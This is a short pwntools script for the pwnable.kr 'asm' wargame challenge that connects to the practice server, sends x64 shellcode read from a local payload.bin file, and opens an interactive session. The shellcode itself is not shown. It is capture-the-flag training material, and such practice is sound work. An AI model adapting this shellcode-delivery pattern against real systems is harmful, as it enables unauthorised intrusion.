import os
os.chdir(os.getcwd() + "/pwnable.kr/Toddler/asm")
from pwn import *

io = remote("pwnable.kr", 10015)

payload = open("payload.bin", "rb").read()

# io.recvuntil(b"give me your x64 shellcode: ")
io.send(payload)

io.interactive()